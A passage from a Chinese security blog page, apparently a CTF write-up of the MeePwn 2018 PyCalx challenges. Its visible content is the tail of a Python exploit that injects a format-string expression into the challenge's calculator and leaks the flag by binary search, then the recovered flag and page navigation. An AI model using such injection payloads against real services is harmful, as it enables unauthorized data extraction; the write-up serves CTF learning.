class="number">0</span>, hi=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="literal">None</span>: hi = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">v1, op, v2, s = <span class="string">&#x27;T&#x27;</span>, <span class="string">&quot;+f&quot;</span>, <span class="string">&quot;ru&#123;FLAG&lt;source or 14:x&#125;&quot;</span>, <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.6[_strikes_backkkkkkkkkkkk)&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img data-src="1531905207979.png" alt="1531905207979"></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/180727rsa-attack/" rel="prev" title="CTF中常见的RSA相关问题总结">
+      <i class="fa fa-chevron-left"></i> CTF中常见的RSA相关问题总结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/180721MeepwnMaplStory/" rel="next" title="Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含">
+      Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PyCalx"><span class="nav-number">1.</span> <span class="nav-text">PyCalx</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PyCalx2"><span class="nav-number">2.</span> <span class="nav-text">PyCalx2</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
